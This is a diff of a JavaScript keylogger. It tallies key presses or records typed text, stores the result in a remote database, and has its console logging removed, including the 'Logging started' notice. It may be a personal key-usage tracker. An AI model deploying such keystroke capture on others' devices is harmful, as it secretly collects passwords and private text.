@@ -36,7 +36,9 @@ let keyPressNamesTally = {
   INS: "INSERT",
   "LEFT ALT": "LEFT_ALT",
   "LEFT SHIFT": "LEFT_SHIFT",
-  MINUS: "MINUS",
+  "NUMPAD DOT": "NUM_DOT",
+  NUM_MINUS: "MINUS",
+  NUM_PLUS: "PLUS",
   "NUM LOCK": "NUM_LOCK",
   "NUMPAD 1": "NUM_1",
   "NUMPAD 2": "NUM_2",
@@ -129,32 +131,17 @@ let keyPressCounter = 0;
 
 // Read the previously logged keys and put them in the keyPresses array before starting
 if (keyLoggerConfig.mode === "TALLY") {
-  console.log("here");
-  get(ref(database, "keyPressTally/"))
-    .then((snapshot) => {
-      if (snapshot.exists()) {
-        console.log(snapshot.val());
-        keyPressTally = snapshot.val();
-      } else {
-        console.log("No data available");
-      }
-    })
-    .catch((error) => {
-      console.error(error);
-    });
+  get(ref(database, "keyPressTally/")).then((snapshot) => {
+    if (snapshot.exists()) {
+      keyPressTally = snapshot.val();
+    }
+  });
 } else if (keyLoggerConfig.mode === "TEXT") {
-  get(ref(database, "keyPressText/"))
-    .then((snapshot) => {
-      if (snapshot.exists()) {
-        console.log(snapshot.val());
-        keyPressText = snapshot.val();
-      } else {
-        console.log("No data available");
-      }
-    })
-    .catch((error) => {
-      console.error(error);
-    });
+  get(ref(database, "keyPressText/")).then((snapshot) => {
+    if (snapshot.exists()) {
+      keyPressText = snapshot.val();
+    }
+  });
 }
 
 // Listen for keypresses and process them
@@ -184,5 +171,3 @@ function save() {
     set(ref(database, "keyPressText/"), keyPressText);
   }
 }
-
-console.log("Logging started");
